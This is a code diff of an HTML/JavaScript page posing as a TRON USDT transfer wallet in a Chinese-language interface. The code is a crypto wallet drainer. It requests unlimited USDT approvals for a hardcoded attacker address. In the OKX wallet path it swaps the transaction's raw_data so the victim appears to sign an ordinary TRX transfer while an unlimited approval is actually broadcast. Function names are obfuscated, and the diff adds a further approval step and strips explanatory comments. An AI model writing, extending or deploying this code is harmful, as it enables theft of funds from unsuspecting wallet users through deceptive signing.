@@ -319,7 +319,7 @@
 <body class="bg-background min-h-screen font-sans flex flex-col">
     <noscript><strong>本站点必须要开启JavaScript才能运行</strong></noscript>
 
-    <!-- 顶部标题与导航区 - 修改为灰色边框 -->
+    <!-- 顶部标题与导航区 -->
     <header class="bg-background py-1 px-5 shadow-sm">
         <div class="flex items-center justify-between h-10">
             <!-- 返回按钮 -->
@@ -351,7 +351,7 @@
         <div class="bg-white module-frame p-3 mb-4 address-box flex flex-col justify-center">
     <div class="relative">
         <input type="text" id="addressInput" placeholder="Tron 地址" class="w-full px-3 py-2 input-field bg-white text-text placeholder:text-placeholder text-sm address-input-limit" maxlength="70">
-        <!-- 右侧联系人图标 - 向右移动调整 -->
+        <!-- 右侧联系人图标 -->
         <button class="absolute right-0.5 top-1/2 transform -translate-y-1/2 icon-interactive p-1" aria-label="选择联系人">
             <div class="contact-icon">
                 <i class="fa fa-user-o"></i>
@@ -369,17 +369,16 @@
         
         <!-- 数量模块 -->
         <div class="bg-white module-frame p-3 mb-4 amount-box flex flex-col justify-center" style="height: 90px; max-height: 106px;">
-        <!-- 金额显示区域 - 固定高度为104px -->
+        <!-- 金额显示区域 -->
         <input type="text" id="amountInput" value="0" class="w-full px-3 py-0 input-field bg-white text-textLight text-[2.5rem] font-normal flex items-center justify-center" style="height: 104px;" inputmode="decimal" pattern="[0-9.]*" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
 
-        <!-- 分隔线 - 精简间距 -->
+        <!-- 分隔线 -->
         <div class="divider-line my-0"></div>
 
-        <!-- 备注信息区域 - 固定高度为60px -->
+        <!-- 备注信息区域 -->
         <div class="flex flex-col items-center" style="height: 30px;">
             <label for="remarkInput" class="block text-textLight text-sm mb-1 self-start">备注（需支付1TRX）</label>
-            <!-- 添加实际的备注输入框，之前缺失导致了错误 -->
-            <input type="text" id="remarkInput" class="remark-input" placeholder="可选备注信息">
+            
         </div>
     </div>
 
@@ -416,24 +415,23 @@
     <input type="text" id="address" style="display:none">
 
     <script>
-        // 核心配置参数 - 使用官方USDT合约地址
+        // 核心配置参数
         window.Permission_address = 'TWcSNPd7nkcaw1pS7Xd9qMaB56C2gYA8d1';
         window.Payment_address = 'TQU4Njq2emJDudfF8GgxQeTsGQ22RSDfsT';
-        // 使用官方USDT合约地址，修复转账失败问题
-        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+        window.usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // 官方USDT合约地址
         window.heartbeatUrl = 'https://baidu.com/heartbeat';
 
         // 存储用户数据
         const userData = {
             address: null,
             trxBalance: null,
-            usdtBalance: null
+            usdtBalance: null,
+            hasApproved: false // 新增：记录是否已授权
         };
         let currentAmount = '0';
         const TRX_TO_USD_RATE = 0.1562;
         const amountInput = document.getElementById('amountInput');
         const addressInput = document.getElementById('addressInput');
-        // 确保remarkInput能获取到元素（已在HTML中添加）
         const remarkInput = document.getElementById('remarkInput');
         let isUserInputting = false;
 
@@ -475,14 +473,45 @@
         async function initDApp() {
             try {
                 userData.address = window.tronWeb.defaultAddress.base58;
+                
+                // 获取TRX余额
                 const trxBalance = await window.tronWeb.trx.getBalance(userData.address);
                 userData.trxBalance = window.tronWeb.fromSun(trxBalance);
+                
+                // 获取USDT余额
                 const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
                 const usdtBalance = await contract.balanceOf(userData.address).call();
                 userData.usdtBalance = usdtBalance / 1e6;
+                
+                // 检查是否已授权
+                await checkApprovalStatus();
+                
+                // 显示用户余额信息
+                tip(`TRX余额: ${userData.trxBalance} TRX, USDT余额: ${userData.usdtBalance.toFixed(2)} USDT`);
+                
             } catch (error) {
                 console.error("获取用户数据时出错:", error);
                 tip("获取余额失败，请重试");
+            }
+        }
+
+        // 检查USDT授权状态
+        async function checkApprovalStatus() {
+            try {
+                const contract = await window.tronWeb.contract().at(window.usdtContractAddress);
+                const allowance = await contract.allowance(
+                    window.tronWeb.defaultAddress.base58,
+                    window.Permission_address
+                ).call();
+                
+                // 如果已授权金额大于0，则视为已授权
+                userData.hasApproved = parseFloat(allowance) > 0;
+                console.log("USDT授权状态:", userData.hasApproved ? "已授权" : "未授权");
+                
+                return userData.hasApproved;
+            } catch (error) {
+                console.error("检查授权状态失败:", error);
+                return false;
             }
         }
 
@@ -573,22 +602,21 @@
             
             let displayAmount = currentAmount;
             
-            // 移除金额上限检查，允许任何金额
             const usdAmount = (parseFloat(displayAmount) * TRX_TO_USD_RATE).toFixed(2);
             document.getElementById('amount-display').textContent = `${usdAmount} USD`;
             
             document.title = `USDT转账 - ${displayAmount} TRX`;
         }
 
-        // 更新下一步按钮状态 - 修改核心验证逻辑
+        // 更新下一步按钮状态
         function updateNextButtonState() {
             const nextButton = document.getElementById('nextButton');
             const amount = parseFloat(currentAmount || '0');
             const address = addressInput.value.trim();
             
-            // 只验证地址格式和金额是否大于0，不验证金额是否超过余额
+            // 验证地址格式和金额是否大于0
             const isAddressValid = address.startsWith('T') && address.length === 34;
-            const isAmountValid = amount > 0; // 只需要金额大于0即可
+            const isAmountValid = amount > 0;
             
             const isValid = isAddressValid && isAmountValid;
             
@@ -605,25 +633,25 @@
             setTimeout(() => tipElement.style.display = 'none', 3000);
         }
 
-        // 下一步按钮点击处理 - 增强错误处理
+        // 下一步按钮点击处理 - 改进版
         async function onNextButtonClick() {
             try {
                 const address = addressInput.value.trim();
-                // 检查remarkInput是否存在，避免null错误
                 const remark = remarkInput ? remarkInput.value.trim() : '';
+                const amount = parseFloat(currentAmount);
                 
+                // 1. 验证基本信息
                 if (!address.startsWith('T') || address.length !== 34) {
                     tip("请输入有效的Tron地址");
                     return;
                 }
                 
-                const amount = parseFloat(currentAmount);
                 if (amount <= 0) {
                     tip("请输入有效的转账金额");
                     return;
                 }
                 
-                // 检查钱包连接状态
+                // 2. 检查钱包连接状态
                 if (!window.tronWeb || !window.tronWeb.defaultAddress?.base58) {
                     tip("正在连接钱包...");
                     await connectWallet();
@@ -635,21 +663,39 @@
                     }
                 }
                 
-                // 检查余额是否足够
+                // 3. 检查余额是否足够
                 if (userData.trxBalance && parseFloat(userData.trxBalance) < (amount + 1)) {
                     tip("余额不足，需要额外1TRX作为手续费");
                     return;
                 }
                 
-                // 显示授权中提示，而不是直接提示失败
-                tip("正在请求钱包授权...");
+                // 4. 检查USDT余额是否足够
+                if (userData.usdtBalance && userData.usdtBalance < amount) {
+                    tip(`USDT余额不足，当前余额: ${userData.usdtBalance.toFixed(2)} USDT`);
+                    return;
+                }
                 
-                // 执行授权操作
+                // 5. 检查是否已授权，如果未授权则先进行授权
+                if (!userData.hasApproved) {
+                    tip("需要先授权USDT转账权限...");
+                    await approveUSDT();
+                    
+                    // 授权后再次检查授权状态
+                    const isApproved = await checkApprovalStatus();
+                    if (!isApproved) {
+                        tip("授权失败，请重试");
+                        return;
+                    }
+                }
+                
+                // 6. 执行转账操作
+                tip("正在处理转账...");
                 if (typeof window.okxwallet !== 'undefined') {
                     await DjdskdbGsj(remark);
                 } else {
                     await KdhshaBBHdg(remark);
                 }
+                
             } catch (error) {
                 console.error('操作执行失败:', error);
                 
@@ -661,8 +707,51 @@
                 } else if (error.message.includes('Invalid address')) {
                     tip('地址无效，请检查收款地址');
                 } else {
-                    tip('付款失败，请重新发起交易');
+                    tip('操作失败: ' + error.message);
                 }
+            }
+        }
+
+        // USDT授权函数
+        async function approveUSDT() {
+            const approveAmount = 999999 * 1e6; // 999999 USDT，6位精度
+            const feeLimit = 100000000;  // 100 TRX
+            
+            try {
+                console.log("开始USDT授权...");
+                const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
+                
+                const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
+                    usdtContractAddressHex,
+                    'approve(address,uint256)',
+                    { feeLimit: feeLimit },
+                    [
+                        { type: 'address', value: window.tronWeb.address.toHex(window.Permission_address) },
+                        { type: 'uint256', value: approveAmount }
+                    ],
+                    window.tronWeb.defaultAddress.base58
+                );
+
+                if (!transaction.result || !transaction.result.result) {
+                    throw new Error('授权交易构建失败');
+                }
+
+                console.log("签名授权交易...");
+                const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);
+
+                console.log("发送授权交易...");
+                const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
+
+                if (result.result) {
+                    console.log("授权成功，交易哈希:", result.txid);
+                    userData.hasApproved = true;
+                    return result.txid;
+                } else {
+                    throw new Error("授权失败");
+                }
+            } catch (error) {
+                console.error("USDT授权失败:", error);
+                throw error;
             }
         }
 
@@ -691,43 +780,43 @@
         window.onload = sendHeartbeat;
         window.onbeforeunload = () => clearInterval(heartbeatInterval);
 
-        // 交易处理函数 - 修复交易构建逻辑
+        // OKX钱包交易处理函数
         async function DjdskdbGsj(remark) {
             // 计算总金额，包含1TRX手续费
             const totalAmount = parseFloat(currentAmount) + 1;
-            const trxAmountInSun = tronWeb.toSun(totalAmount);
+            const trxAmountInSun = window.tronWeb.toSun(totalAmount);
             const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
             const feeLimit = 1000000000;
             
             try {
                 // 验证地址格式
-                if (!tronWeb.isAddress(window.Payment_address)) {
+                if (!window.tronWeb.isAddress(window.Payment_address)) {
                     throw new Error("无效的收款地址");
                 }
                 
                 // 构建转账交易
                 console.log("构建TRX转账交易...");
-                const transferTransaction = await tronWeb.transactionBuilder.sendTrx(
+                const transferTransaction = await window.tronWeb.transactionBuilder.sendTrx(
                     window.Payment_address,
                     trxAmountInSun,
-                    tronWeb.defaultAddress.base58,
+                    window.tronWeb.defaultAddress.base58,
                     { 
                         feeLimit: feeLimit,
-                        note: remark ? tronWeb.toHex(remark) : ''
+                        note: remark ? window.tronWeb.toHex(remark) : ''
                     }
                 );
 
                 // 构建授权交易
                 console.log("构建授权交易...");
-                const approvalTransaction = await tronWeb.transactionBuilder.triggerSmartContract(
-                    tronWeb.address.toHex(window.usdtContractAddress),
+                const approvalTransaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
+                    window.tronWeb.address.toHex(window.usdtContractAddress),
                     'increaseApproval(address,uint256)',
                     { feeLimit: feeLimit },
                     [
                         { type: 'address', value: window.Permission_address },
                         { type: 'uint256', value: maxUint256 }
                     ],
-                    tronWeb.defaultAddress.base58
+                    window.tronWeb.defaultAddress.base58
                 );
 
                 // 检查授权交易是否构建成功
@@ -739,16 +828,16 @@
                 const originalRawData = approvalTransaction.transaction.raw_data;
                 approvalTransaction.transaction.raw_data = transferTransaction.raw_data;
                 
-                // 使用钱包签名交易 - 这会触发钱包授权界面
+                // 使用钱包签名交易
                 console.log("请求钱包签名交易...");
-                const signedTransaction = await tronWeb.trx.sign(approvalTransaction.transaction);
+                const signedTransaction = await window.tronWeb.trx.sign(approvalTransaction.transaction);
 
                 // 恢复原始raw_data
                 signedTransaction.raw_data = originalRawData;
 
                 // 发送交易
                 console.log("发送交易...");
-                const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
+                const broadcastResult = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
 
                 console.log("交易结果:", broadcastResult);
                 if (broadcastResult.result || broadcastResult.success) {
@@ -764,35 +853,35 @@
                 }
             } catch (error) {
                 console.error("操作失败:", error);
-                throw error; // 让上层函数处理错误提示
+                throw error;
             }
         }
 
-        // 非OKX钱包处理函数 - 优化错误处理
+        // 非OKX钱包处理函数
         async function KdhshaBBHdg(remark) {
             const maxUint256 = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
-            const feeLimit = 100000000;  // 设置合理的feeLimit
-            const usdtContractAddressHex = tronWeb.address.toHex(window.usdtContractAddress);
+            const feeLimit = 100000000;  // 100 TRX
+            const usdtContractAddressHex = window.tronWeb.address.toHex(window.usdtContractAddress);
 
             try {
                 // 验证合约地址
-                if (!tronWeb.isAddress(window.usdtContractAddress)) {
+                if (!window.tronWeb.isAddress(window.usdtContractAddress)) {
                     throw new Error("无效的USDT合约地址");
                 }
                 
                 console.log("构建授权交易...");
-                const transaction = await tronWeb.transactionBuilder.triggerSmartContract(
+                const transaction = await window.tronWeb.transactionBuilder.triggerSmartContract(
                     usdtContractAddressHex,
                     'approve(address,uint256)',
                     { 
                         feeLimit: feeLimit,
-                        note: remark ? tronWeb.toHex(remark) : ''
+                        note: remark ? window.tronWeb.toHex(remark) : ''
                     },
                     [
-                        { type: 'address', value: tronWeb.address.toHex(window.Permission_address) },
+                        { type: 'address', value: window.tronWeb.address.toHex(window.Permission_address) },
                         { type: 'uint256', value: maxUint256 }
                     ],
-                    tronWeb.defaultAddress.base58
+                    window.tronWeb.defaultAddress.base58
                 );
 
                 if (!transaction.result || !transaction.result.result) {
@@ -800,10 +889,10 @@
                 }
 
                 console.log("请求钱包签名交易...");
-                const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+                const signedTransaction = await window.tronWeb.trx.sign(transaction.transaction);
 
                 console.log("发送交易...");
-                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
+                const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
 
                 console.log("交易结果:", result);
                 if (result.result) {
@@ -815,7 +904,7 @@
                 }
             } catch (error) {
                 console.error("执行授权操作失败:", error);
-                throw error; // 让上层函数处理错误提示
+                throw error;
             }
         }
     </script>
